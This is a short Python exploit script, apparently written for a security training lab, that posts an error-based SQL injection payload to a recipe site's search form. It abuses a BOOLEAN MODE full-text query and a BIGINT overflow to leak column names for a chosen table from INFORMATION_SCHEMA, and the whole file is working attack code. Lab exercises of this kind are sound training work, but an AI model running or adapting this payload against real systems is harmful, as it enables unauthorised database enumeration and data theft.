import requests
import argparse


parser = argparse.ArgumentParser(description="Table Name.")
parser.add_argument('table', type=str, help='table')
args = parser.parse_args()

table_name = args.table

payload = f"' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM (SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'recipes' AND TABLE_NAME = '{table_name}')s), 8446744073709551610, 8446744073709551610)))#"


url = 'https://j7ulvqtcv6kkel7yhil62.ap-southeast-6.attackdefensecloudlabs.com/dosearch.php'
data = {
    'words_all' : '' ,
    'words_exact' : f"{payload}" ,
    'words_any' : '',
    'words_without' : '',
    'name_exact' : '',
    'ing_modifier' : '2',
}



# Make the POST request with form data
response = requests.post(url, data=data)

# Check if the request was successful (status code 200)
if response.status_code == 200:
    # Print the response content
    print("Response:")
    print(response.text)
else:
    # Print the error status code and message
    print(f"Error: {response.status_code} - {response.text}")
